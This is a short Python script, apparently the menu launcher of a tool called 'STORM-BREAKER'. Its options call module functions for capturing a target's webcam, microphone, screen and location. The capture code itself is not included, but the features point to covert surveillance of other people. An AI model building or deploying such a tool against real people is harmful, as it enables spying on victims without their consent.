from colorama import Fore
import os
import sys
from modules import banner
import requests
from modules import localhost
import platform


sysname = platform.uname()[0]


while True:
    banner.banner()
    banner.infolist0()
    

    try:

        input1 = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"STORM-BREAKER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"₿ ")
        
        if input1 == "1":
            localhost.webcham()
        
        elif input1 == "2":
            if sysname == "Windows":
                banner.banner()
                print("\n This feature only works on Linux distributions\n".title())
                input(Fore.RED+" [!]"+Fore.GREEN+" Back To Menu (Press Enter...) ")
            else:
                localhost.micro()
        
        elif input1 == "3":
            banner.banner()
            localhost.screen()

        

        elif input1 == "4":
            banner.banner()
            localhost.location()
        
        elif input1 == "5":
            banner.banner()
            banner.infolist1()

        elif input1 == "6":
            print("\n God Lock :) ")
            sys.exit()

        
            



    except KeyboardInterrupt:
        print("")
        sys.exit()